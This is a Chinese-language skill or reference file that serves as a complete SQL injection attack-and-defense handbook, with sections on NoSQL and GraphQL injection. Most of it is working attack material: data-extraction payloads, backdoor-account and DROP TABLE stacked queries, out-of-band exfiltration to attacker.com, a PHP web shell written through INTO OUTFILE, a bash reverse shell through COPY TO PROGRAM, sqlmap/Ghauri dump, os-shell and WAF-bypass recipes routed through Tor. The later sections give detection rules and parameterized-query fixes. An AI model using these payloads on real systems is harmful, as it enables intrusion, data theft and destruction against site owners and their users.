---
name: web-injection-sqli
description: >
  全面覆盖 SQL 注入漏洞的识别、利用、检测和修复。涵盖所有 SQL 注入变体
 （经典、盲注、时间盲注、二阶注入、带外注入、联合查询、堆叠查询），
  支持所有主流数据库（MySQL、PostgreSQL、MSSQL、Oracle、SQLite），
  集成手工测试方法论与 sqlmap 自动化利用，包含 WAF 绕过、编码混淆、
  HTTP 参数污染等技术，以及防御侧的参数化查询、ORM 安全、输入验证。
domain: cybersecurity
subdomain: web-security
tags: [sqli, sql-injection, sqlmap, blind-injection, second-order, out-of-band, waf-bypass, database-security, owasp-a1]
version: 2.0.0
---

# SQL 注入 — 完整攻防手册

## 适用场景

- Web 应用渗透测试中发现用户输入被拼接到 SQL 查询中
- 需要评估应用是否易受 SQL 注入攻击
- 已确认注入点，需要利用提取数据或获取系统权限
- 代码审计中发现动态 SQL 构造
- 需要设计或验证 SQL 注入防护措施

**不适用于** NoSQL 注入（参见 `web-injection-nosql`）、LDAP 注入、或 XPath 注入。

---

## Part A：攻击方法论

### 1. 注入点识别

#### 1.1 经典检测载荷

```
# 错误触发 — 观察数据库错误信息
' OR 1=1 --
' OR '1'='1
" OR ""="
1' OR '1'='1' --+
1' ORDER BY 1--+          # 列数探测

# 数学表达式 — 观察逻辑差异
1 AND 1=1                  # 真 → 正常页面
1 AND 1=2                  # 假 → 异常页面

# 时间延迟 — 盲注探测
1' AND SLEEP(5)--+         # MySQL
1'; WAITFOR DELAY '0:0:5'--   # MSSQL
1' AND pg_sleep(5)--+      # PostgreSQL
1' UNION SELECT NULL--     # Oracle (需 SELECT)
```

#### 1.2 按注入位置分类

| 位置 | 测试方法 | 示例 |
|------|---------|------|
| WHERE 子句 | 最常见，直接逻辑操纵 | `?id=1' OR 1=1--` |
| ORDER BY | 无法直接 UNION，需条件盲注 | `?sort=IF(1=1,name,price)` |
| LIMIT/OFFSET | 空间受限，需技巧 | `LIMIT 0,1 UNION SELECT...` |
| INSERT 语句 | 二阶注入或子查询 | `INSERT INTO t VALUES(''||(SELECT pwd FROM users)||'')` |
| UPDATE 语句 | 可修改数据 | `UPDATE t SET name=''||(SELECT pwd FROM users)||'' WHERE id=1` |
| HTTP 头部 | Referer, User-Agent, Cookie | `Cookie: session=' OR 1=1--` |
| JSON 参数 | JSON 值注入 | `{"id":"1' OR 1=1--"}` |

### 2. 注入变体与利用

#### 2.1 联合查询注入（UNION）

```sql
-- Step 1: 确定列数
' ORDER BY 1--+    -- 递增直到报错
' UNION SELECT NULL,NULL,NULL--+

-- Step 2: 确定可显示列
' UNION SELECT 'a','b','c'--+

-- Step 3: 提取数据库信息
' UNION SELECT version(),database(),user()--+

-- Step 4: 枚举表和列（MySQL）
' UNION SELECT table_name,column_name,table_schema
  FROM information_schema.columns--+

-- Step 5: 提取数据
' UNION SELECT username,password,NULL FROM users--+
```

#### 2.2 盲注（Boolean-based）

```sql
-- 逐字符提取
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')>'m'--

-- 二分查找优化
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) > 64--
```

#### 2.3 盲注（Time-based）

```sql
-- MySQL
' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--

-- MSSQL
'; IF(SUBSTRING(DB_NAME(),1,1)='a') WAITFOR DELAY '0:0:5'--

-- PostgreSQL
' AND (SELECT CASE WHEN SUBSTRING(current_database(),1,1)='a'
  THEN pg_sleep(5) ELSE pg_sleep(0) END)--
```

#### 2.4 二阶注入

```sql
-- 第一步：注册恶意用户名（不触发过滤）
Username: admin'--
Password: anything

-- 第二步：用户名被拼接到另一条查询中
-- 实际执行: SELECT * FROM users WHERE username='admin'--' AND password='...'
-- 导致: 认证绕过或数据泄露
```

#### 2.5 带外注入（Out-of-band）

```sql
-- MySQL (需要 FILE 权限 + LOAD_FILE)
' UNION SELECT LOAD_FILE(CONCAT('\\\\',database(),'.attacker.com\\a'))--

-- MSSQL
'; EXEC master..xp_dirtree '\\'+DB_NAME()+'.attacker.com\a'--

-- Oracle
' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||username||':'||password) FROM users--
```

#### 2.6 堆叠查询（Stacked Queries）

```sql
-- 仅当后端支持多语句执行
'; DROP TABLE users--;              # 破坏性（仅测试用）
'; INSERT INTO users VALUES('hacker','pwned')--;  # 后门账户
'; UPDATE users SET role='admin' WHERE username='hacker'--;  # 提权
```

### 3. sqlmap 自动化利用

#### 3.1 基础用法

```bash
# 检测注入点
sqlmap -u "http://target/page?id=1" --batch --dbs

# 指定注入参数和类型
sqlmap -u "http://target/page?id=1" -p id --technique=BEUSTQ

# POST 请求
sqlmap -u "http://target/login" --data="user=admin&pass=test" -p user

# 带 Cookie/Token
sqlmap -u "http://target/page?id=1" --cookie="session=abc123"
sqlmap -u "http://target/page?id=1" --token="csrf_token_value"

# 从 Burp 请求文件
sqlmap -r request.txt -p id
```

#### 3.2 数据库枚举

```bash
# 列出数据库
sqlmap -u "URL" --dbs

# 列出表
sqlmap -u "URL" -D database_name --tables

# 列出列
sqlmap -u "URL" -D database_name -T users --columns

# 提取数据
sqlmap -u "URL" -D database_name -T users -C username,password --dump

# 提取所有数据
sqlmap -u "URL" -D database_name --dump-all
```

#### 3.3 高级利用

```bash
# 操作系统 shell（MySQL/MSSQL）
sqlmap -u "URL" --os-shell

# SQL shell
sqlmap -u "URL" --sql-shell

# 文件读写
sqlmap -u "URL" --file-read="/etc/passwd"
sqlmap -u "URL" --file-write="shell.php" --file-dest="/var/www/html/shell.php"

# 数据库提权
sqlmap -u "URL" --privileges
sqlmap -u "URL" --passwords

# 绕过 WAF
sqlmap -u "URL" --tamper=space2comment,between,randomcase
sqlmap -u "URL" --random-agent --delay=2 --proxy="socks5://127.0.0.1:9050"
```

#### 3.4 常用 Tamper 脚本

| 脚本 | 用途 |
|------|------|
| `space2comment` | 空格替换为 `/**/` |
| `between` | `>` 替换为 `NOT BETWEEN 0 AND` |
| `randomcase` | 随机大小写 |
| `charencode` | URL 编码 |
| `charunicodeencode` | Unicode 编码 |
| `equaltolike` | `=` 替换为 `LIKE` |
| `percentage` | 添加 `%` |
| `versionedkeywords` | MySQL 版本注释 |
| `apostrophemask` | `'` 替换为 `%EF%BC%87` |

### 4. WAF 绕过技术

```sql
-- 大小写混淆
uNiOn SeLeCt 1,2,3--

-- 注释绕过
UN/**/ION SE/**/LECT 1,2,3--

-- 编码绕过
%55%4e%49%4f%4e %53%45%4c%45%43%54

-- 内联注释（MySQL）
/*!50000UNION*//*!50000SELECT*/ 1,2,3--

-- 双重编码
%2555%254e%2549%254f%254e

-- HTTP 参数污染
?id=1&id=UNION SELECT 1,2,3--

-- 替代关键字
UNION ALL SELECT → UNION%0aALL%0aSELECT
FROM → !%0aFROM%0a
```

### 5. 数据库特定技巧

#### MySQL

```sql
-- 文件读写（需 FILE 权限）
' UNION SELECT LOAD_FILE('/etc/passwd')--
' UNION SELECT '<?php system($_GET[cmd]);?>' INTO OUTFILE '/var/www/html/shell.php'--

-- 提权
' UNION SELECT GRANT_FILE FROM mysql.user--
' UNION SELECT LOAD_FILE('/etc/shadow')--
```

#### MSSQL

```sql
-- xp_cmdshell（需 sysadmin）
'; EXEC sp_configure 'show advanced options',1;RECONFIGURE--
'; EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE--
'; EXEC xp_cmdshell 'whoami'--

-- 提取哈希
' UNION SELECT name,master.dbo.fn_varbintohexstr(password_hash),NULL FROM sys.sql_logins--
```

#### PostgreSQL

```sql
-- 命令执行（需 superuser）
'; COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"'--

-- 大对象导入
'; SELECT lo_import('/etc/passwd', 12345)--
'; SELECT lo_export(12345, '/tmp/out')--
```

#### Oracle

```sql
-- 获取 DBA 权限
' UNION SELECT GRANTED_ROLE FROM user_role_privs WHERE GRANTED_ROLE='DBA'--

-- Java 源代码执行
'; CREATE OR REPLACE JAVA SOURCE NAMED "cmd" AS
  import java.io.*; public class cmd { public static String exec(String c)
  { try { BufferedReader br = new BufferedReader(new InputStreamReader(
  Runtime.getRuntime().exec(c).getInputStream())); String s; StringBuilder sb
  = new StringBuilder(); while((s=br.readLine())!=null) sb.append(s);
  return sb.toString(); } catch(Exception e) { return e.toString(); } } }--
```

---

## Part B：检测与防御

### 6. 检测规则

#### 6.1 Sigma 规则（日志检测）

```yaml
title: SQL Injection Pattern in Web Request
status: experimental
logsource:
  category: webserver
detection:
  selection:
    cs-uri-query|contains:
      - "' OR "
      - "UNION SELECT"
      - "SLEEP("
      - "BENCHMARK("
      - "WAITFOR DELAY"
      - "xp_cmdshell"
      - "information_schema"
      - "LOAD_FILE("
      - "INTO OUTFILE"
  condition: selection
level: high
tags:
  - attack.t1190
  - attack.initial_access
```

#### 6.2 ModSecurity CRS 规则

```
SecRule ARGS "(?i:union\s+(?:all\s+)?select)" \
  "id:1001,phase:2,deny,status:403,msg:'SQL Injection - UNION SELECT'"
```

### 7. 修复方案

#### 7.1 参数化查询（首选）

```python
# Python — 正确
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))

# Python — 错误（存在漏洞）
cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")
```

```java
// Java JDBC — 正确
PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE id = ?");
stmt.setInt(1, userId);

// Java JDBC — 错误
Statement stmt = conn.createStatement();
stmt.executeQuery("SELECT * FROM users WHERE id = " + userId);
```

```php
// PHP PDO — 正确
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id");
$stmt->execute(['id' => $id]);

// PHP — 错误
mysqli_query($conn, "SELECT * FROM users WHERE id = " . $_GET['id']);
```

#### 7.2 ORM 安全配置

```python
# Django ORM — 安全
User.objects.filter(id=user_id)

# Django raw — 参数化安全
User.objects.raw("SELECT * FROM auth_user WHERE id = %s", [user_id])

# Django extra — 不安全，避免使用
User.objects.extra(where=["id = %s" % user_id])  # 危险！
```

#### 7.3 纵深防御

| 层级 | 措施 |
|------|------|
| 输入验证 | 白名单校验、类型转换、长度限制 |
| 参数化查询 | 永远不要拼接 SQL |
| 最小权限 | 应用账户只授予必要权限，禁止 FILE/ADMIN |
| WAF | 部署 ModSecurity CRS 或云 WAF |
| 日志监控 | 监控 SQL 错误和异常查询模式 |
| 存储过程 | 使用存储过程封装数据访问 |

---

## 速查矩阵

| 数据库 | 版本探测 | 当前库 | 列出表 | 读文件 | 命令执行 |
|--------|---------|--------|--------|--------|---------|
| MySQL | `@@version` | `database()` | `information_schema.tables` | `LOAD_FILE()` | `INTO OUTFILE` / UDF |
| MSSQL | `@@version` | `DB_NAME()` | `sys.tables` | `OPENROWSET(BULK...)` | `xp_cmdshell` |
| PostgreSQL | `version()` | `current_database()` | `information_schema.tables` | `lo_import()` | `COPY TO PROGRAM` |
| Oracle | `v$version` | `SYS_CONTEXT('USERENV','DB_NAME')` | `all_tables` | `UTL_FILE` | Java Source / DBMS_SCHEDULER |
| SQLite | `sqlite_version()` | `PRAGMA database_list` | `sqlite_master` | N/A | N/A |

## MITRE ATT&CK 映射

| Tactic | Technique | ID |
|--------|-----------|-----|
| Initial Access | Exploit Public-Facing Application | T1190 |
| Credential Access | OS Credential Dumping | T1003 |
| Execution | Command and Scripting Interpreter | T1059 |
| Privilege Escalation | SQL Injection → DBA | T1068 |
| Exfiltration | Exfiltration Over Alternative Protocol | T1048 |

## Part C：2025-2026 更新

> 以下内容覆盖近年新增的注入攻击面、绕过技术和防御演进。

### 8. GraphQL 注入

#### 8.1 内省查询泄露（Introspection Reconnaissance）

```graphql
# 获取完整 Schema — 生产环境应禁用
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    types {
      name
      fields {
        name
        args { name type { name } }
      }
    }
  }
}
```

**防御**：生产环境禁用内省，或仅对已认证管理员开放。

#### 8.2 字段参数 SQL 注入

当 GraphQL resolver 将参数直接拼接至 SQL 查询时：

```graphql
# 正常请求
query { user(id: "1") { name email } }

# 恶意请求 — id 参数触发 SQL 注入
query { user(id: "1' UNION SELECT password,username FROM admins--") { name email } }
```

#### 8.3 Mutation 写操作滥用

```graphql
# 授权绕过：利用 read-only token 执行 mutation（参考 CVE-2025-11340 GitLab）
mutation {
  updateVulnerability(input: { id: "VGQTAUTI", severity: "critical" }) {
    vulnerability { id severity }
  }
}
```

#### 8.4 批量查询 DoS

```graphql
# 单次请求发送数百条重复查询，耗尽服务器资源
[
  { "query": "{ user(id:1) { name } }" },
  { "query": "{ user(id:2) { name } }" },
  { "query": "{ user(id:3) { name } }" },
  # ... 数百条
]
```

**防御**：限制查询深度、复杂度评分、批量请求数量。

#### 8.5 GraphQL 注入检测清单

| 检查项 | 方法 |
|--------|------|
| 内省是否暴露 | 发送 `__schema` 查询 |
| 字段级授权 | 查询无权限字段（如 `adminNote`） |
| 参数注入 | 在 String/Int 参数中注入 `' OR 1=1--` |
| Mutation 越权 | 用低权限 token 调用 mutation |
| 查询深度 | 嵌套超过 10 层的递归查询 |
| 别名绕过 | 使用别名绕过字段级限速 |

---

### 9. NoSQL 注入（MongoDB / CouchDB）

#### 9.1 MongoDB 运算符注入

```json
// 认证绕过 — 用户名密码未知时
POST /login
{"username": {"$ne": ""}, "password": {"$ne": ""}}

// 等价于 SQL: WHERE username != '' AND password != ''

// 使用 $gt 提取数据
{"username": "admin", "password": {"$gt": ""}}

// 正则盲注 — 逐字符提取
{"username": "admin", "password": {"$regex": "^a"}}
{"username": "admin", "password": {"$regex": "^ab"}}
```

#### 9.2 MongoDB $where JavaScript 注入

```javascript
// $where 允许执行任意 JavaScript 表达式
// 正常查询
db.users.find({ $where: "this.username == 'admin'" });

// 注入 — 提取数据
db.users.find({
  $where: "function(){if(this.password[0]=='a'){sleep(5000);}return false;}"
});

// 简化形式
$db.users.find({ $where: "this.password.match(/^a/)!=null" });
```

#### 9.3 聚合管道注入

```json
// 若应用直接将用户输入传入聚合管道
{"$match": {"status": "active; db.users.find({},{password:1})"}}

// $expr 注入
{"$expr": {"$gt": [{"$strLenCP": "$password"}, 0]}, "username": {"$ne": ""}}
```

#### 9.4 CouchDB 注入

```
// CouchDB MapReduce 视图注入
GET /db/_design/users/_view/by_name?key="admin' || doc.password || '"

// CouchDB Mango 查询注入
POST /db/_find
{"selector": {"username": "admin", "password": {"$gt": ""}}}
```

#### 9.5 NoSQL 注入防御

```javascript
// Node.js + MongoDB — 使用 mongoose 类型校验
const schema = new mongoose.Schema({
  username: { type: String, required: true },
  password: { type: String, required: true }
});

// 严禁将原始用户输入作为查询对象
// 错误：
db.collection.find(req.body);  // 直接传入请求体

// 正确：
db.collection.find({ username: String(req.body.username) });
```

| 措施 | 说明 |
|------|------|
| 输入类型强制转换 | 确保 String 字段不接受 Object（如 `{"$ne":""}`） |
| 禁用 `$where` | 生产环境禁用 JavaScript 执行引擎 |
| 白名单字段 | 仅允许预期字段名进入查询 |
| 最小权限 | 数据库账户不授予 `anyAction` 权限 |

---

### 10. 二阶 SQL 注入实战案例

#### 10.1 电商系统用户名注入

```
// 步骤1：注册恶意账户 — 用户名不被转义存储
POST /register
username=admin'--+&password=attacker123

// 步骤2：修改密码功能拼接用户名
// 后端代码：query = "UPDATE users SET password='" + newPwd + "' WHERE username='" + session.username + "'"
// 实际执行：UPDATE users SET password='newHash' WHERE username='admin'--+' AND ...
// 结果：admin 的密码被直接覆盖
POST /changepassword
new_password=hacked123&confirm_password=hacked123
```

#### 10.2 评论系统 XSS + 二阶 SQL 注入组合

```
// 步骤1：在评论中注入 SQL 片段（被存储到数据库）
POST /comment
comment=Nice post!' UNION SELECT password FROM admins WHERE username='admin'--

// 步骤2：管理员后台导出评论时触发
// 后端代码：query = "SELECT * FROM comments WHERE post_id=" + postId + " AND content LIKE '%" + exportFilter + "%'"
// 若 exportFilter 也拼接了数据库中的评论内容，则触发注入
```

#### 10.3 二阶注入带外数据外泄

```sql
-- 步骤1：在地址字段中存储带外载荷
Address: '; EXEC master..xp_dirtree '\\attacker.com\'+(SELECT TOP 1 password_hash FROM users)+'.share'--

-- 步骤2：后台批量发货查询触发 xp_dirtree，DNS 请求泄露密码哈希
```

#### 10.4 sqlmap 二阶注入检测

```bash
# sqlmap 的 --second-order 参数用于检测二阶注入
# 指定载荷触发后响应出现在哪个页面
sqlmap -r first-request.txt --second-order="http://target/profile"

# 需要提供两个请求文件：注入点请求 + 结果页面请求
sqlmap -u "http://target/register" --data="user=test&pass=123" \
  --second-order="http://target/login" --second-order-method=POST \
  --second-order-data="user=test&pass=123"
```

---

### 11. sqlmap 最新 Tamper 脚本（2025-2026）

#### 11.1 新增 / 更新的 Tamper 脚本

| 脚本 | 用途 | 适用 WAF |
|------|------|----------|
| `space2mysqldash` | 空格 → `--` 注释（MySQL 风格） | 通用 |
| `informationschemacomment` | `information_schema` → `information_schema/**/` | ModSecurity CRS |
| `nullbytecharset` | 添加 `%00` 字符集混淆 | 部分硬件 WAF |
| `jsonescape` | JSON 编码特殊字符 | JSON API 场景 |
| `scriptComment` | 注入 `<script>` 标签混淆 | 混合解析场景 |
| `slashescape` | 反斜杠转义绕过 | addslashes 场景 |

#### 11.2 针对特定 WAF 的 Tamper 组合

```bash
# Cloudflare WAF
sqlmap -u "URL" --tamper=space2comment,randomcase,charencode,logicalEscape \
  --random-agent --delay=3 --proxy="socks5://127.0.0.1:9050"

# AWS WAF
sqlmap -u "URL" --tamper=space2mysqldash,between,percentage,versionedkeywords \
  --random-agent --chunked

# Azure WAF / ModSecurity
sqlmap -u "URL" --tamper=space2comment,apostrophemask,equaltolike,informationschemacomment \
  --random-agent --hpp

# 通杀组合（多层混淆）
sqlmap -u "URL" --tamper=space2comment,between,randomcase,charencode,logicalEscape \
  --random-agent --delay=2 --safe-url="http://target/normal-page" --safe-freq=50
```

#### 11.3 社区 Tamper 脚本资源

- [sqlmap-tamper-collection](https://github.com/noobforanonymous/sqlmap-tamper-collection)：针对 Cloudflare、AWS WAF、Azure WAF 的 2025 绕过脚本集合
- [Atlas](https://github.com/m4ll0k/Atlas)：自动化 Tamper 脚本侦察工具，根据目标 WAF 自动选择最优组合

---

### 12. WAF 绕过矩阵（2025-2026）

#### 12.1 按 WAF 类型分类的绕过策略

| WAF 类型 | 代表产品 | 绕过策略 |
|----------|---------|----------|
| 云 WAF | Cloudflare、AWS WAF、Azure Front Door | 分块传输（chunked）、JSON 语法绕过、HTTP/2 多路复用、延迟分片 |
| 硬件 WAF | Imperva、F5 ASM、FortiWeb | 协议解析差异、双重 URL 编码、Unicode 标准化、JSON 嵌套 |
| 软件 WAF | ModSecurity CRS、NAXSI、OpenAppSec | 正则回溯超限、内联注释（MySQL）、版本注释、HPP |
| CDN WAF | Akamai Kona、Cloudflare Pro/Biz | 请求走私（Request Smuggling）、HTTP 参数污染、路径混淆 |

#### 12.2 JSON 语法绕过（2025 新趋势）

```
// 传统载荷被 WAF 拦截
?id=1 UNION SELECT 1,2,3--

// JSON 格式载荷绕过多数 WAF 的 SQL 解析器
Content-Type: application/json
{"id": "1 UNION SELECT 1,2,3--"}

// 嵌套 JSON 进一步混淆
{"user": {"id": "1' UNION/**/SELECT 1,password,3 FROM users WHERE username='admin'--"}}

// JSON 数组绕过
{"ids": ["1' OR 1=1--"]}
```

**原理**：多数 WAF 对 `application/x-www-form-urlencoded` 解析成熟，但对 JSON 请求体的 SQL 关键字检测存在盲区。

#### 12.3 分块传输绕过

```bash
# 利用 Transfer-Encoding: chunked 拆分载荷
# Burp Suite Chunked Coding Converter 插件
# sqlmap 代理模式
sqlmap -u "URL" --proxy="http://127.0.0.1:8080" --chunked
```

#### 12.4 HTTP/2 多路复用绕过

```
# 部分 WAF 对 HTTP/2 流的重组不完整
# 使用 HTTP/2 并发流发送拆分的 SQL 关键字
Stream 1: ?id=1' UNIO
Stream 2: N SEL
Stream 3: ECT 1,2,3--
```

#### 12.5 WAF 绕过速查矩阵

| 绕过技术 | 载荷示例 | 适用场景 |
|----------|---------|----------|
| 大小写混淆 | `uNiOn SeLeCt` | 简单正则 |
| 内联注释 | `/*!50000UNION*//*!50000SELECT*/` | MySQL + ModSecurity |
| 双重编码 | `%2555%254e%2549%254f%254e` | 硬件 WAF |
| HTTP 参数污染 | `?id=1&id=UNION SELECT` | IIS/Apache 后端 |
| JSON 嵌套 | `{"a":{"b":"1' OR 1=1--"}}` | 云 WAF（2025） |
| 分块传输 | `Transfer-Encoding: chunked` | Cloudflare、AWS WAF |
| Unicode 标准化 | `%EF%BC%87`（全角单引号） | 国际化场景 |
| 注释换行 | `UNION%0aSELECT` | 空白字符过滤 |
| 科学计数法 | `1e0 UNION SELECT` | 数字型注入 |
| 反引号包裹 | `` `UNION` `SELECT` `` | MySQL 关键字过滤 |

---

### 13. ORM 安全（SQLAlchemy / Prisma / TypeORM）

#### 13.1 SQLAlchemy（Python）

```python
# 安全 — 参数化查询
from sqlalchemy import text
result = session.execute(text("SELECT * FROM users WHERE id = :id"), {"id": user_id})

# 危险 — 字符串拼接
session.execute(text(f"SELECT * FROM users WHERE id = {user_id}"))  # 可被注入！

# 安全 — ORM 查询
session.query(User).filter(User.id == user_id).all()

# 危险 — filter 中使用原始表达式
session.query(User).filter(f"id = {user_id}").all()  # 可被注入！

# 安全 — text() + bindparams
from sqlalchemy import text, bindparam
stmt = text("SELECT * FROM users WHERE name = :name").bindparams(bindparam("name", value=name))
```

#### 13.2 Prisma（Node.js / TypeScript）

```typescript
// 安全 — Prisma 标准查询 API
const user = await prisma.user.findUnique({
  where: { id: userId }
});

// 危险 — $queryRaw 未使用参数化
await prisma.$queryRaw`SELECT * FROM users WHERE id = ${userId}`;  // Tagged template 安全
await prisma.$queryRawUnsafe(`SELECT * FROM users WHERE id = ${userId}`);  // 危险！可被注入

// 安全 — $queryRaw tagged template（自动参数化）
await prisma.$queryRaw`SELECT * FROM users WHERE name = ${Prisma.sql`${name}`}`;

// 危险 — 拼接字符串
await prisma.$queryRawUnsafe("SELECT * FROM users WHERE id = " + userId);  // 可被注入！
```

#### 13.3 TypeORM（Node.js / TypeScript）

```typescript
// 安全 — QueryBuilder 参数化
const users = await repository
  .createQueryBuilder("user")
  .where("user.id = :id", { id: userId })
  .getMany();

// 危险 — 字符串拼接
await repository
  .createQueryBuilder("user")
  .where(`user.id = ${userId}`)  // 可被注入！
  .getMany();

// CVE-2025-60542（已修复于 v0.3.26）
// TypeORM < 0.3.26 的 repository.save() / repository.update()
// 在 mysql2 驱动下可被注入，因 sqlstring 库 stringifyObjects 默认为 false
// 升级至 TypeORM >= 0.3.26 可修复
```

#### 13.4 ORM 安全核心原则

| 原则 | 说明 |
|------|------|
| 永远使用 ORM 标准查询 API | `filter()`、`findUnique()`、`createQueryBuilder().where(":id")` |
| 避免原始查询 | 除非必要，且必须使用参数化绑定 |
| 禁止字符串拼接 | 即使在 Raw Query 中也要用参数占位符 |
| 保持依赖更新 | TypeORM CVE-2025-60542 等漏洞需及时升级 |
| 代码审计重点 | 搜索 `.raw()`、`$queryRawUnsafe`、`text(f"...")` 等危险调用 |
| SAST 扫描 | 集成 Semgrep / CodeQL 检测 ORM 原始查询注入 |

---

### 14. 更新 MITRE ATT&CK 映射（2025-2026）

| Tactic | Technique | ID | 说明 |
|--------|-----------|-----|------|
| Initial Access | Exploit Public-Facing Application | **T1190** | SQL 注入仍为主要初始访问向量（CVE-2025-25257 FortiWeb） |
| Execution | Command and Scripting Interpreter | **T1059** | 通过 SQL 注入执行系统命令（xp_cmdshell / COPY TO PROGRAM） |
| Persistence | Account Manipulation | **T1098** | 通过堆叠注入创建后门数据库账户 |
| Privilege Escalation | Exploitation for Privilege Escalation | **T1068** | SQL 注入提升至 DBA 权限 |
| Defense Evasion | Obfuscated Files or Information | **T1027** | WAF 绕过载荷（编码、混淆、分块） |
| Credential Access | OS Credential Dumping | **T1003** | 从数据库提取密码哈希 |
| Credential Access | Credentials from Password Stores | **T1552** | 数据库中存储的应用凭证 |
| Discovery | Remote System Discovery | **T1018** | 通过数据库链接服务器发现内网拓扑 |
| Lateral Movement | Remote Services | **T1021** | 数据库链接服务器（MSSQL Linked Server）横向移动 |
| Exfiltration | Exfiltration Over Alternative Protocol | **T1048** | 带外注入通过 DNS/HTTP 外泄数据 |
| Exfiltration | Exfiltration Over C2 Channel | **T1041** | 通过数据库连接通道外泄数据 |
| Impact | Data Manipulation | **T1565** | 通过堆叠注入篡改业务数据 |
| Impact | Data Destruction | **T1485** | `DROP TABLE` / `TRUNCATE` 破坏数据 |
| Impact | Service Denial | **T1498** | `BENCHMARK()` / `SLEEP()` 拒绝服务 |

---

### 15. 2025-2026 关键 CVE 参考

| CVE | 产品 | 类型 | CVSS |
|-----|------|------|------|
| CVE-2025-25257 | Fortinet FortiWeb | 前认证 SQL 注入 → RCE | 9.8（Critical） |
| CVE-2025-60542 | TypeORM < 0.3.26 | SQL 注入（mysql2 驱动） | High |
| CVE-2025-11340 | GitLab GraphQL | Mutation 授权绕过 | High |

---

### 16. 更新防御检测规则（2025-2026）

#### 16.1 检测 NoSQL 注入

```yaml
title: NoSQL Injection Pattern in Web Request
status: experimental
logsource:
  category: webserver
detection:
  selection:
    cs-uri-query|contains:
      - "$where"
      - "$ne"
      - "$gt"
      - "$regex"
      - "$expr"
      - "this.password"
      - "sleep(5000)"
  condition: selection
level: high
tags:
  - attack.t1190
  - attack.initial_access
```

#### 16.2 检测 GraphQL 内省泄露

```yaml
title: GraphQL Introspection Query from External Source
status: experimental
logsource:
  category: webserver
detection:
  selection:
    cs-uri-query|contains: "__schema"
  filter:
    src-ip|cidr:
      - "10.0.0.0/8"
      - "172.16.0.0/12"
      - "192.168.0.0/16"
  condition: selection and not filter
level: medium
tags:
  - attack.t1590
  - attack.reconnaissance
```

#### 16.3 检测 JSON 格式 SQL 注入

```yaml
title: SQL Injection via JSON Request Body
status: experimental
logsource:
  category: webserver
detection:
  selection:
    cs-content-type|contains: "application/json"
    cs-body|contains:
      - "UNION SELECT"
      - "OR 1=1"
      - "' OR '"
      - "SLEEP("
      - "BENCHMARK("
      - "$where"
      - "$ne"
  condition: selection
level: high
tags:
  - attack.t1190
  - attack.initial_access
```

---

### 17. Ghauri — 下一代 SQL 注入自动化工具（2025-2026）

> Ghauri 是继 sqlmap 之后的新型 SQL 注入自动化工具，在 WAF 绕过能力上显著优于 sqlmap，
> 特别擅长 Header-based Blind SQLi 和复杂 WAF 场景。

#### 17.1 Ghauri vs sqlmap 对比

| 特性 | sqlmap | Ghauri |
|------|--------|--------|
| 成熟度 | 老牌工具，社区庞大 | 较新，专注 WAF 绕过 |
| DBMS 支持 | 7+ 数据库类型 | MySQL/MSSQL/PostgreSQL/Oracle/SQLite |
| WAF 绕过 | 依赖 tamper 脚本组合 | **内置高级绕过引擎** |
| 盲注能力 | 良好，但遇强 WAF 可能失败 | **Header-based 盲注专精** |
| 载荷生成 | 通用型 | 针对性更强，成功率高 |
| 代理/隧道 | 支持 | 支持且更灵活 |

#### 17.2 Ghauri 基础用法

```bash
# 安装
pip install ghauri

# 基础检测（类似 sqlmap）
ghauri -u "http://target/page?id=1" --dbs

# 指定注入参数和绕过级别
ghauri -u "http://target/page?id=1" -p id --level=3 --risk=3

# 绕过强 WAF（Ghauri 的核心优势）
ghauri -u "http://target/page?id=1" --random-agent --time-delay=3 \
  --proxy="http://127.0.0.1:8080"

# 提取数据
ghauri -u "URL" -D database_name --tables
ghauri -u "URL" -D database_name -T users --dump

# Header-based 盲注（sqlmap 难以处理的场景）
ghauri -r request.txt -p "X-Forwarded-For" --technique=T --time-delay=5
```

#### 17.3 何时选择 Ghauri 而非 sqlmap

| 场景 | 推荐工具 | 原因 |
|------|---------|------|
| 通用注入检测 | sqlmap | DBMS 支持广、插件多 |
| 强 WAF 环境 | Ghauri | 内置绕过引擎更有效 |
| Header 盲注 | Ghauri | Header 注入专精 |
| sqlmap 被拦截后 | Ghauri | 换工具绕过 WAF 指纹 |
| OS Shell/文件操作 | sqlmap | 功能更全面 |
| 大批量自动化 | sqlmap | 批处理/管道支持更好 |

**参考**：[Ghauri GitHub](https://github.com/r0oth3x49/ghauri)

---

### 18. Claroty Team82 — JSON-Based SQL 注入 WAF 绕过研究

> Claroty Team82 发现了一种**通用 WAF 绕过技术**：利用 JSON 语法结构嵌入 SQL 注入载荷。
> 主流 WAF 厂商的 SQL 解析引擎不支持 JSON 语法，导致 JSON 中的 SQL 关键字被忽略。

#### 18.1 技术原理

```
传统请求（被 WAF 拦截）：
POST /api/users
Content-Type: application/x-www-form-urlencoded
id=1 UNION SELECT username,password FROM users--

JSON 格式请求（绕过 WAF）：
POST /api/users
Content-Type: application/json
{"id": "1 UNION SELECT username,password FROM users--"}

嵌套 JSON 进一步混淆：
{"filter": {"conditions": [{"field": "id", "operator": "=", "value": "1' UNION/**/SELECT 1,password,3 FROM users--"}]}}

JSON 数组绕过：
{"ids": ["1' OR 1=1--"], "limit": 10}
```

**根本原因**：WAF 解析器将 JSON 值视为普通字符串，不对其中的 SQL 关键字进行模式匹配。
此技术在 **Imperva、F5、ModSecurity** 等主流 WAF 上均已验证有效。

#### 18.2 防御 JSON-Based SQL 注入

```nginx
# ModSecurity — 增加 JSON 请求体检测
SecRule REQUEST_BODY "@rx (?i)(union\s+select|or\s+1\s*=\s*1|'\s*or\s*'|sleep\s*\()" \
  "id:2100,phase:2,deny,status:403,msg:'SQL Injection in JSON body'"

# 关键：确保解析 JSON 请求体
SecRule REQUEST_HEADERS:Content-Type "@rx application/json" \
  "id:2101,phase:1,pass,nolog,ctl:forceRequestBodyVariable=On"
```

